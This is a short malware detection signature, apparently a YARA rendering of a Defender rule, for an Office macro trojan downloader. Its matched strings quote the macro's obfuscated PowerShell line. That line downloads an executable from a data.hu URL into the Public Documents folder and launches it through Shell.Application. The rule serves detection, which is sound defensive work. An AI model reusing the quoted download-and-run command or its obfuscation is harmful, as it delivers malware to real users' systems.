
rule TrojanDownloader_O97M_EncDoc_PDA_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.PDA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {2d 77 20 68 69 20 73 6c 65 65 5e 70 20 2d 53 65 20 33 31 3b 53 74 61 5e 72 74 2d 42 69 74 73 54 72 61 6e 73 5e 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 3a 2f 2f 64 64 6c 37 2e 64 61 74 61 2e 68 75 2f 67 65 74 2f 33 34 31 36 37 36 2f 31 33 30 35 38 31 33 39 2f 4b 53 2e 65 60 78 65 22 } //1 -w hi slee^p -Se 31;Sta^rt-BitsTrans^fer -Source htt`p://ddl7.data.hu/get/341676/13058139/KS.e`xe"
		$a_01_1 = {44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 61 63 63 6f 75 6e 74 66 6f 72 65 69 67 6e 2e 65 60 78 65 22 20 26 } //1 Destination C:\Users\Public\Documents\accountforeign.e`xe" &
		$a_01_2 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 68 65 65 65 20 26 20 22 6c 2e 61 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 28 79 65 74 6f 74 68 65 72 73 29 } //1 CreateObject(sheee & "l.application").Open(yetothers)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1) >=3
 
}